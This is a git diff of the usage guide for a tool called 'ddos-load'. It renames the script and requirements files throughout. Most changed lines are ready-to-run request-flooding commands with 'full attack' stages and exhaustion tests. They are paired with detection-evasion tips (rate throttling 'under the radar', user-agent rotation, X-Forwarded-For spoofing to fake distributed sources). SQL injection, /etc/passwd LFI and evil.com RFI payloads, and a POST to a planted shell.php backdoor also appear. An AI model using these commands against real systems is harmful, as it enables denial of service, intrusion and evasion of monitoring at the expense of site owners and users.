@@ -83,10 +83,10 @@ git clone https://github.com/rudraksha-avatara/ddos-load.git
 cd ddos-load
 
 # Install dependencies
-pip3 install -r requirements.txt
+pip3 install -r requirements-kali-linux.txt
 
 # Verify installation
-python3 main.py --help
+python3 main-kali-linux.py --help
 ```
 
 ### Method 2: System-wide Installation
@@ -97,10 +97,10 @@ sudo git clone https://github.com/rudraksha-avatara/ddos-load.git /opt/ddos-load
 cd /opt/ddos-load
 
 # Install dependencies
-sudo pip3 install -r requirements.txt
+sudo pip3 install -r requirements-kali-linux.txt
 
 # Create symbolic link for easy access
-sudo ln -s /opt/ddos-load/main.py /usr/local/bin/loadtest
+sudo ln -s /opt/ddos-load/main-kali-linux.py /usr/local/bin/loadtest
 
 # Now you can run from anywhere
 loadtest --help
@@ -121,10 +121,10 @@ python3 -m venv venv
 source venv/bin/activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r requirements-kali-linux.txt
 
 # Run tool
-python main.py --help
+python main-kali-linux.py --help
 ```
 
 ### Verify Installation
@@ -137,7 +137,7 @@ python3 --version
 pip3 list | grep aiohttp
 
 # Test basic functionality
-python3 main.py http://testphp.vulnweb.com -n 10 -c 2
+python3 main-kali-linux.py http://testphp.vulnweb.com -n 10 -c 2
 ```
 
 ### Troubleshooting Installation
@@ -147,7 +147,7 @@ python3 main.py http://testphp.vulnweb.com -n 10 -c 2
 sudo apt install python3-pip
 
 # If you get permission errors
-pip3 install --user -r requirements.txt
+pip3 install --user -r requirements-kali-linux.txt
 
 # If aiohttp fails to install
 sudo apt install python3-dev build-essential
@@ -165,40 +165,40 @@ pip3 install --upgrade pip
 
 ```bash
 # Light probe (won't trigger most IDS)
-python3 main.py http://target.com -n 50 -c 5
+python3 main-kali-linux.py http://target.com -n 50 -c 5
 
 # Medium load test
-python3 main.py http://target.com -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache
 
 # Heavy stress test (with authorization)
-python3 main.py http://target.com -n 5000 -c 100 --no-cache --random-ua
+python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache --random-ua
 ```
 
 ### Testing Discovered Endpoints
 
 ```bash
 # After nmap/nikto scan, test discovered endpoints
-python3 main.py http://target.com/admin -n 1000 -c 50 --no-cache
+python3 main-kali-linux.py http://target.com/admin -n 1000 -c 50 --no-cache
 
 # Test API endpoints
-python3 main.py http://target.com/api/v1/users -n 2000 -c 75 --no-cache
+python3 main-kali-linux.py http://target.com/api/v1/users -n 2000 -c 75 --no-cache
 
 # Test login page
-python3 main.py http://target.com/login -n 500 -c 30 --no-cache
+python3 main-kali-linux.py http://target.com/login -n 500 -c 30 --no-cache
 ```
 
 ### With Burp Suite Integration
 
 ```bash
 # Test endpoint found in Burp
-python3 main.py http://target.com/vulnerable-endpoint \
+python3 main-kali-linux.py http://target.com/vulnerable-endpoint \
   -n 1000 -c 50 \
   -H "Cookie: session=abc123" \
   -H "User-Agent: Mozilla/5.0" \
   --no-cache
 
 # Test POST endpoint from Burp
-python3 main.py http://target.com/api/submit \
+python3 main-kali-linux.py http://target.com/api/submit \
   -n 500 -c 25 \
   -m POST \
   -H "Content-Type: application/json" \
@@ -215,7 +215,7 @@ python3 main.py http://target.com/api/submit \
 
 ```bash
 # Test login endpoint for rate limiting
-python3 main.py http://target.com/api/login \
+python3 main-kali-linux.py http://target.com/api/login \
   -n 1000 -c 50 \
   -m POST \
   -H "Content-Type: application/json" \
@@ -223,7 +223,7 @@ python3 main.py http://target.com/api/login \
   --no-cache
 
 # Test if rate limiting is implemented
-python3 main.py http://target.com/api/login \
+python3 main-kali-linux.py http://target.com/api/login \
   -d 60 -c 100 \
   -m POST \
   --body '{"username":"admin","password":"wrong"}' \
@@ -234,13 +234,13 @@ python3 main.py http://target.com/api/login \
 
 ```bash
 # Test session handling under load
-python3 main.py http://target.com/dashboard \
+python3 main-kali-linux.py http://target.com/dashboard \
   -n 2000 -c 100 \
   -H "Cookie: PHPSESSID=test123" \
   --no-cache
 
 # Test session fixation vulnerability
-python3 main.py http://target.com/login \
+python3 main-kali-linux.py http://target.com/login \
   -n 500 -c 25 \
   -H "Cookie: SESSIONID=fixed_session" \
   --no-cache
@@ -250,18 +250,18 @@ python3 main.py http://target.com/login \
 
 ```bash
 # Test API rate limiting
-python3 main.py http://target.com/api/v1/data \
+python3 main-kali-linux.py http://target.com/api/v1/data \
   -n 5000 -c 200 \
   -H "Authorization: Bearer token123" \
   --no-cache
 
 # Test API without authentication
-python3 main.py http://target.com/api/v1/users \
+python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 1000 -c 50 \
   --no-cache
 
 # Test API with different methods
-python3 main.py http://target.com/api/v1/resource \
+python3 main-kali-linux.py http://target.com/api/v1/resource \
   -n 500 -c 25 \
   -m DELETE \
   -H "Authorization: Bearer token123"
@@ -271,17 +271,17 @@ python3 main.py http://target.com/api/v1/resource \
 
 ```bash
 # Test application resilience (with authorization)
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 10000 -c 500 \
   --no-cache --random-ua
 
 # Test specific resource-intensive endpoint
-python3 main.py http://target.com/search?q=test \
+python3 main-kali-linux.py http://target.com/search?q=test \
   -d 300 -c 200 \
   --no-cache
 
 # Test file upload endpoint
-python3 main.py http://target.com/upload \
+python3 main-kali-linux.py http://target.com/upload \
   -n 100 -c 10 \
   -m POST \
   --timeout 120 \
@@ -292,13 +292,13 @@ python3 main.py http://target.com/upload \
 
 ```bash
 # Test cache behavior
-python3 main.py http://target.com/page \
+python3 main-kali-linux.py http://target.com/page \
   -n 1000 -c 50 \
   -H "X-Forwarded-Host: evil.com" \
   --no-cache
 
 # Test cache with different headers
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Original-URL: /admin" \
   --random-ua
@@ -308,12 +308,12 @@ python3 main.py http://target.com \
 
 ```bash
 # Test if SQL injection is exploitable under load
-python3 main.py "http://target.com/search?id=1' OR '1'='1" \
+python3 main-kali-linux.py "http://target.com/search?id=1' OR '1'='1" \
   -n 500 -c 25 \
   --no-cache
 
 # Test time-based SQL injection
-python3 main.py "http://target.com/user?id=1' AND SLEEP(5)--" \
+python3 main-kali-linux.py "http://target.com/user?id=1' AND SLEEP(5)--" \
   -n 100 -c 10 \
   --timeout 60
 ```
@@ -322,7 +322,7 @@ python3 main.py "http://target.com/user?id=1' AND SLEEP(5)--" \
 
 ```bash
 # Test CSRF protection under load
-python3 main.py http://target.com/transfer \
+python3 main-kali-linux.py http://target.com/transfer \
   -n 500 -c 25 \
   -m POST \
   -H "Cookie: session=abc123" \
@@ -334,7 +334,7 @@ python3 main.py http://target.com/transfer \
 
 ```bash
 # Test XML endpoint under load
-python3 main.py http://target.com/api/xml \
+python3 main-kali-linux.py http://target.com/api/xml \
   -n 500 -c 25 \
   -m POST \
   -H "Content-Type: application/xml" \
@@ -346,12 +346,12 @@ python3 main.py http://target.com/api/xml \
 
 ```bash
 # Test LFI under load
-python3 main.py "http://target.com/page?file=../../../../etc/passwd" \
+python3 main-kali-linux.py "http://target.com/page?file=../../../../etc/passwd" \
   -n 500 -c 25 \
   --no-cache
 
 # Test RFI
-python3 main.py "http://target.com/page?file=http://evil.com/shell.txt" \
+python3 main-kali-linux.py "http://target.com/page?file=http://evil.com/shell.txt" \
   -n 200 -c 10 \
   --no-cache
 ```
@@ -360,7 +360,7 @@ python3 main.py "http://target.com/page?file=http://evil.com/shell.txt" \
 
 ```bash
 # Test race condition in payment
-python3 main.py http://target.com/api/purchase \
+python3 main-kali-linux.py http://target.com/api/purchase \
   -n 100 -c 50 \
   -m POST \
   -H "Authorization: Bearer token123" \
@@ -368,7 +368,7 @@ python3 main.py http://target.com/api/purchase \
   --no-cache
 
 # Test concurrent transactions
-python3 main.py http://target.com/api/transfer \
+python3 main-kali-linux.py http://target.com/api/transfer \
   -n 50 -c 25 \
   -m POST \
   --body '{"from":"user1","to":"user2","amount":100}' \
@@ -384,37 +384,37 @@ python3 main.py http://target.com/api/transfer \
 ```bash
 # Phase 1: Reconnaissance (Light touch)
 echo "Phase 1: Reconnaissance"
-python3 main.py http://target.com -n 50 -c 5
+python3 main-kali-linux.py http://target.com -n 50 -c 5
 
 # Phase 2: Endpoint Discovery Testing
 echo "Phase 2: Testing discovered endpoints"
-python3 main.py http://target.com/admin -n 100 -c 10 --no-cache
-python3 main.py http://target.com/api -n 100 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/admin -n 100 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/api -n 100 -c 10 --no-cache
 
 # Phase 3: Authentication Testing
 echo "Phase 3: Authentication stress test"
-python3 main.py http://target.com/login \
+python3 main-kali-linux.py http://target.com/login \
   -n 500 -c 25 -m POST \
   --body '{"user":"admin","pass":"test"}' \
   --no-cache
 
 # Phase 4: Session Management
 echo "Phase 4: Session handling test"
-python3 main.py http://target.com/dashboard \
+python3 main-kali-linux.py http://target.com/dashboard \
   -n 1000 -c 50 \
   -H "Cookie: session=test123" \
   --no-cache
 
 # Phase 5: API Security
 echo "Phase 5: API stress test"
-python3 main.py http://target.com/api/v1/users \
+python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 2000 -c 100 \
   -H "Authorization: Bearer token" \
   --no-cache
 
 # Phase 6: DoS Resilience (with authorization)
 echo "Phase 6: DoS resilience test"
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 5000 -c 200 \
   --no-cache --random-ua
 ```
@@ -441,23 +441,23 @@ echo "[*] Results will be saved to $OUTPUT_DIR"
 
 # Test 1: Baseline
 echo "[+] Test 1: Baseline performance"
-python3 main.py "$TARGET" -n 100 -c 10 > "$OUTPUT_DIR/01_baseline.txt"
+python3 main-kali-linux.py "$TARGET" -n 100 -c 10 > "$OUTPUT_DIR/01_baseline.txt"
 
 # Test 2: Moderate load
 echo "[+] Test 2: Moderate load"
-python3 main.py "$TARGET" -n 1000 -c 50 --no-cache > "$OUTPUT_DIR/02_moderate.txt"
+python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache > "$OUTPUT_DIR/02_moderate.txt"
 
 # Test 3: Heavy load
 echo "[+] Test 3: Heavy load"
-python3 main.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua > "$OUTPUT_DIR/03_heavy.txt"
+python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua > "$OUTPUT_DIR/03_heavy.txt"
 
 # Test 4: Stress test
 echo "[+] Test 4: Stress test"
-python3 main.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua > "$OUTPUT_DIR/04_stress.txt"
+python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua > "$OUTPUT_DIR/04_stress.txt"
 
 # Test 5: Duration test
 echo "[+] Test 5: Duration test (60 seconds)"
-python3 main.py "$TARGET" -d 60 -c 100 --no-cache > "$OUTPUT_DIR/05_duration.txt"
+python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache > "$OUTPUT_DIR/05_duration.txt"
 
 echo "[*] Testing complete! Results saved to $OUTPUT_DIR"
 echo "[*] Summary:"
@@ -481,7 +481,7 @@ chmod +x pentest_load.sh
 nmap -sV -p 80,443,8080 target.com
 
 # Then test discovered web services
-python3 main.py http://target.com:8080 -n 1000 -c 50 --no-cache
+python3 main-kali-linux.py http://target.com:8080 -n 1000 -c 50 --no-cache
 ```
 
 ### With Nikto
@@ -491,15 +491,15 @@ python3 main.py http://target.com:8080 -n 1000 -c 50 --no-cache
 nikto -h http://target.com -o nikto_results.txt
 
 # Test endpoints found by nikto
-python3 main.py http://target.com/admin -n 500 -c 25 --no-cache
-python3 main.py http://target.com/backup -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 ```
 
 ### With Burp Suite
 
 ```bash
 # Export request from Burp Suite, then test it
-python3 main.py http://target.com/api/endpoint \
+python3 main-kali-linux.py http://target.com/api/endpoint \
   -n 1000 -c 50 \
   -m POST \
   -H "Cookie: session=from_burp" \
@@ -515,7 +515,7 @@ python3 main.py http://target.com/api/endpoint \
 sqlmap -u "http://target.com/page?id=1" --batch
 
 # Then test the vulnerable endpoint under load
-python3 main.py "http://target.com/page?id=1" \
+python3 main-kali-linux.py "http://target.com/page?id=1" \
   -n 500 -c 25 --no-cache
 ```
 
@@ -523,7 +523,7 @@ python3 main.py "http://target.com/page?id=1" \
 
 ```bash
 # After exploiting with Metasploit, test the backdoor
-python3 main.py http://target.com/shell.php \
+python3 main-kali-linux.py http://target.com/shell.php \
   -n 100 -c 10 \
   -m POST \
   --body "cmd=whoami"
@@ -533,8 +533,8 @@ python3 main.py http://target.com/shell.php \
 
 ```bash
 # After ZAP spider, test discovered endpoints
-python3 main.py http://target.com/api/users -n 1000 -c 50 --no-cache
-python3 main.py http://target.com/admin/panel -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com/api/users -n 1000 -c 50 --no-cache
+python3 main-kali-linux.py http://target.com/admin/panel -n 500 -c 25 --no-cache
 ```
 
 ### With Gobuster/Dirb
@@ -544,8 +544,8 @@ python3 main.py http://target.com/admin/panel -n 500 -c 25 --no-cache
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 
 # Test found directories
-python3 main.py http://target.com/admin -n 500 -c 25 --no-cache
-python3 main.py http://target.com/backup -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
 ```
 
 ### With WPScan (WordPress)
@@ -555,12 +555,12 @@ python3 main.py http://target.com/backup -n 500 -c 25 --no-cache
 wpscan --url http://target.com
 
 # Test WordPress endpoints
-python3 main.py http://target.com/wp-login.php \
+python3 main-kali-linux.py http://target.com/wp-login.php \
   -n 500 -c 25 -m POST \
   --body "log=admin&pwd=test" \
   --no-cache
 
-python3 main.py http://target.com/wp-json/wp/v2/users \
+python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
   -n 1000 -c 50 --no-cache
 ```
 
@@ -582,13 +582,13 @@ echo "[*] Phase 3: Directory Enumeration"
 gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt
 
 echo "[*] Phase 4: Load Testing Main Site"
-python3 main.py "http://$TARGET" -n 1000 -c 50 --no-cache > load_main.txt
+python3 main-kali-linux.py "http://$TARGET" -n 1000 -c 50 --no-cache > load_main.txt
 
 echo "[*] Phase 5: Load Testing Admin Panel"
-python3 main.py "http://$TARGET/admin" -n 500 -c 25 --no-cache > load_admin.txt
+python3 main-kali-linux.py "http://$TARGET/admin" -n 500 -c 25 --no-cache > load_admin.txt
 
 echo "[*] Phase 6: API Stress Test"
-python3 main.py "http://$TARGET/api" -n 2000 -c 100 --no-cache > load_api.txt
+python3 main-kali-linux.py "http://$TARGET/api" -n 2000 -c 100 --no-cache > load_api.txt
 
 echo "[*] Assessment complete!"
 ```
@@ -601,13 +601,13 @@ echo "[*] Assessment complete!"
 
 ```bash
 # Very slow, under the radar
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 100 -c 2 \
   --rate-limit 5 \
   --random-ua
 
 # Gradual increase
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -d 300 -c 10 \
   --rate-limit 10 \
   --random-ua
@@ -618,13 +618,13 @@ python3 main.py http://target.com \
 ```bash
 # Simulate distributed attack from single machine
 # Terminal 1
-python3 main.py http://target.com -d 60 -c 50 --random-ua &
+python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &
 
 # Terminal 2
-python3 main.py http://target.com -d 60 -c 50 --random-ua &
+python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &
 
 # Terminal 3
-python3 main.py http://target.com -d 60 -c 50 --random-ua &
+python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &
 
 # Wait for all to complete
 wait
@@ -634,13 +634,13 @@ wait
 
 ```bash
 # Test with specific user agent
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
   --no-cache
 
 # Test with mobile user agent
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
   --no-cache
@@ -650,19 +650,19 @@ python3 main.py http://target.com \
 
 ```bash
 # Test X-Forwarded-For bypass
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Forwarded-For: 127.0.0.1" \
   --no-cache
 
 # Test Host header injection
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "Host: evil.com" \
   --no-cache
 
 # Test multiple headers
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 500 -c 25 \
   -H "X-Forwarded-For: 127.0.0.1" \
   -H "X-Real-IP: 127.0.0.1" \
@@ -674,27 +674,27 @@ python3 main.py http://target.com \
 
 ```bash
 # Test HTTP/1.1
-python3 main.py http://target.com -n 1000 -c 50 --no-cache
+python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache
 
 # Test HTTPS with various ciphers
-python3 main.py https://target.com -n 1000 -c 50 --no-cache
+python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-cache
 
 # Test with self-signed cert
-python3 main.py https://target.com -n 1000 -c 50 --no-verify-ssl
+python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-verify-ssl
 ```
 
 ### 6. Timing Attack Testing
 
 ```bash
 # Test response time variations
-python3 main.py http://target.com/login \
+python3 main-kali-linux.py http://target.com/login \
   -n 100 -c 1 \
   -m POST \
   --body '{"username":"admin","password":"test"}' \
   --no-cache
 
 # Compare with wrong username
-python3 main.py http://target.com/login \
+python3 main-kali-linux.py http://target.com/login \
   -n 100 -c 1 \
   -m POST \
   --body '{"username":"wronguser","password":"test"}' \
@@ -705,18 +705,18 @@ python3 main.py http://target.com/login \
 
 ```bash
 # Test memory exhaustion
-python3 main.py http://target.com/large-response \
+python3 main-kali-linux.py http://target.com/large-response \
   -n 1000 -c 100 \
   --no-cache
 
 # Test connection exhaustion
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -d 300 -c 500 \
   --no-keep-alive \
   --no-cache
 
 # Test bandwidth exhaustion
-python3 main.py http://target.com/download/large-file \
+python3 main-kali-linux.py http://target.com/download/large-file \
   -n 100 -c 50 \
   --timeout 300
 ```
@@ -725,20 +725,20 @@ python3 main.py http://target.com/download/large-file \
 
 ```bash
 # Slow requests to avoid detection
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 500 -c 10 \
   --rate-limit 20 \
   --random-ua \
   --no-cache
 
 # Vary user agents
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   --random-ua \
   --no-cache
 
 # Add legitimate-looking headers
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "Referer: https://google.com" \
   -H "Accept-Language: en-US,en;q=0.9" \
@@ -750,10 +750,10 @@ python3 main.py http://target.com \
 
 ```bash
 # Test API with various payloads
-python3 main.py http://target.com/api/user/1 -n 100 -c 10 --no-cache
-python3 main.py http://target.com/api/user/-1 -n 100 -c 10 --no-cache
-python3 main.py http://target.com/api/user/999999 -n 100 -c 10 --no-cache
-python3 main.py "http://target.com/api/user/1' OR '1'='1" -n 100 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/api/user/1 -n 100 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/api/user/-1 -n 100 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/api/user/999999 -n 100 -c 10 --no-cache
+python3 main-kali-linux.py "http://target.com/api/user/1' OR '1'='1" -n 100 -c 10 --no-cache
 ```
 
 ### 10. Multi-Stage Attack Simulation
@@ -765,22 +765,22 @@ python3 main.py "http://target.com/api/user/1' OR '1'='1" -n 100 -c 10 --no-cach
 TARGET="$1"
 
 echo "[*] Stage 1: Reconnaissance (Stealth)"
-python3 main.py "$TARGET" -n 50 -c 2 --rate-limit 5 --random-ua
+python3 main-kali-linux.py "$TARGET" -n 50 -c 2 --rate-limit 5 --random-ua
 
 sleep 10
 
 echo "[*] Stage 2: Probing (Light)"
-python3 main.py "$TARGET" -n 200 -c 10 --random-ua --no-cache
+python3 main-kali-linux.py "$TARGET" -n 200 -c 10 --random-ua --no-cache
 
 sleep 10
 
 echo "[*] Stage 3: Exploitation Attempt (Moderate)"
-python3 main.py "$TARGET/admin" -n 500 -c 25 --random-ua --no-cache
+python3 main-kali-linux.py "$TARGET/admin" -n 500 -c 25 --random-ua --no-cache
 
 sleep 10
 
 echo "[*] Stage 4: Full Attack (Heavy)"
-python3 main.py "$TARGET" -n 5000 -c 200 --random-ua --no-cache
+python3 main-kali-linux.py "$TARGET" -n 5000 -c 200 --random-ua --no-cache
 
 echo "[*] Multi-stage test complete"
 ```
@@ -793,14 +793,14 @@ echo "[*] Multi-stage test complete"
 
 ```bash
 # Low rate to avoid threshold detection
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 10 \
   --rate-limit 50 \
   --random-ua
 
 # Randomize timing
 for i in {1..10}; do
-    python3 main.py http://target.com -n 100 -c 5 --random-ua
+    python3 main-kali-linux.py http://target.com -n 100 -c 5 --random-ua
     sleep $((RANDOM % 30 + 10))
 done
 ```
@@ -809,14 +809,14 @@ done
 
 ```bash
 # Test with X-Forwarded-For rotation
-python3 main.py http://target.com/api \
+python3 main-kali-linux.py http://target.com/api \
   -n 1000 -c 50 \
   -H "X-Forwarded-For: 1.2.3.4" \
   --no-cache
 
 # Test with different IPs
 for ip in 1.1.1.1 8.8.8.8 9.9.9.9; do
-    python3 main.py http://target.com/api \
+    python3 main-kali-linux.py http://target.com/api \
       -n 500 -c 25 \
       -H "X-Forwarded-For: $ip" \
       --no-cache
@@ -827,7 +827,7 @@ done
 
 ```bash
 # Use legitimate user agents
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
   -H "Referer: https://www.google.com/" \
@@ -835,7 +835,7 @@ python3 main.py http://target.com \
   --no-cache
 
 # Slow and steady
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -d 600 -c 20 \
   --rate-limit 30 \
   --random-ua
@@ -845,13 +845,13 @@ python3 main.py http://target.com \
 
 ```bash
 # Rotate user agents
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 2000 -c 100 \
   --random-ua \
   --no-cache
 
 # Add realistic headers
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
   -H "Accept-Language: en-US,en;q=0.5" \
@@ -873,10 +873,10 @@ TARGET="$1"
 DURATION=60
 
 # Simulate multiple sources
-python3 main.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 1.1.1.1" --random-ua &
-python3 main.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 8.8.8.8" --random-ua &
-python3 main.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 9.9.9.9" --random-ua &
-python3 main.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 4.4.4.4" --random-ua &
+python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 1.1.1.1" --random-ua &
+python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 8.8.8.8" --random-ua &
+python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 9.9.9.9" --random-ua &
+python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 4.4.4.4" --random-ua &
 
 wait
 echo "[*] Distributed simulation complete"
@@ -893,16 +893,16 @@ echo "[*] Distributed simulation complete"
 mkdir -p reports/$(date +%Y%m%d)
 
 # Run tests and save results
-python3 main.py http://target.com -n 1000 -c 50 --no-cache \
+python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache \
   > reports/$(date +%Y%m%d)/baseline_test.txt
 
-python3 main.py http://target.com -n 5000 -c 100 --no-cache \
+python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache \
   > reports/$(date +%Y%m%d)/moderate_load.txt
 
-python3 main.py http://target.com -n 10000 -c 200 --no-cache \
+python3 main-kali-linux.py http://target.com -n 10000 -c 200 --no-cache \
   > reports/$(date +%Y%m%d)/heavy_load.txt
 
-python3 main.py http://target.com -d 300 -c 150 --no-cache \
+python3 main-kali-linux.py http://target.com -d 300 -c 150 --no-cache \
   > reports/$(date +%Y%m%d)/sustained_load.txt
 ```
 
@@ -951,31 +951,31 @@ EOF
 echo "[*] Running Test 1: Baseline Performance"
 echo "Test 1: Baseline Performance (100 requests, 10 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
-python3 main.py "$TARGET" -n 100 -c 10 >> "$REPORT_DIR/report.txt" 2>&1
+python3 main-kali-linux.py "$TARGET" -n 100 -c 10 >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
 echo "[*] Running Test 2: Moderate Load"
 echo "Test 2: Moderate Load (1000 requests, 50 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
-python3 main.py "$TARGET" -n 1000 -c 50 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
+python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
 echo "[*] Running Test 3: Heavy Load"
 echo "Test 3: Heavy Load (5000 requests, 100 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
-python3 main.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
+python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
 echo "[*] Running Test 4: Stress Test"
 echo "Test 4: Stress Test (10000 requests, 200 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
-python3 main.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
+python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
 echo "[*] Running Test 5: Sustained Load"
 echo "Test 5: Sustained Load (60 seconds, 100 concurrent)" >> "$REPORT_DIR/report.txt"
 echo "---" >> "$REPORT_DIR/report.txt"
-python3 main.py "$TARGET" -d 60 -c 100 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
+python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
 echo "" >> "$REPORT_DIR/report.txt"
 
 cat >> "$REPORT_DIR/report.txt" << EOF
@@ -1142,7 +1142,7 @@ Emergency Contact: [Phone/Email]
    script -a pentest_log_$(date +%Y%m%d).txt
    
    # Run your tests
-   python3 main.py http://target.com -n 1000 -c 50 --no-cache
+   python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache
    
    # Exit logging
    exit
@@ -1152,7 +1152,7 @@ Emergency Contact: [Phone/Email]
    ```bash
    # Only test authorized targets
    AUTHORIZED_TARGET="http://client-authorized-domain.com"
-   python3 main.py "$AUTHORIZED_TARGET" -n 1000 -c 50 --no-cache
+   python3 main-kali-linux.py "$AUTHORIZED_TARGET" -n 1000 -c 50 --no-cache
    ```
 
 4. **Respect Time Windows**
@@ -1214,20 +1214,20 @@ sudo apt update
 sudo apt install python3.9
 
 # Use specific Python version
-python3.9 main.py http://target.com -n 100 -c 10
+python3.9 main-kali-linux.py http://target.com -n 100 -c 10
 ```
 
 #### 2. Permission Errors
 
 ```bash
 # If you get permission denied
-chmod +x main.py
+chmod +x main-kali-linux.py
 
 # If pip install fails
-pip3 install --user -r requirements.txt
+pip3 install --user -r requirements-kali-linux.txt
 
 # Or use sudo (not recommended for pip)
-sudo pip3 install -r requirements.txt
+sudo pip3 install -r requirements-kali-linux.txt
 ```
 
 #### 3. Network Issues
@@ -1240,7 +1240,7 @@ ping target.com
 curl -I http://target.com
 
 # Test with minimal load first
-python3 main.py http://target.com -n 10 -c 1
+python3 main-kali-linux.py http://target.com -n 10 -c 1
 ```
 
 #### 4. Too Many Open Files
@@ -1267,7 +1267,7 @@ sudo nano /etc/security/limits.conf
 
 ```bash
 # For self-signed certificates
-python3 main.py https://target.com \
+python3 main-kali-linux.py https://target.com \
   -n 100 -c 10 \
   --no-verify-ssl
 
@@ -1287,7 +1287,7 @@ free -h
 watch -n 1 free -h
 
 # Reduce concurrency if low on memory
-python3 main.py http://target.com -n 5000 -c 25
+python3 main-kali-linux.py http://target.com -n 5000 -c 25
 ```
 
 #### 7. DNS Resolution Issues
@@ -1297,7 +1297,7 @@ python3 main.py http://target.com -n 5000 -c 25
 nslookup target.com
 
 # Use IP address directly
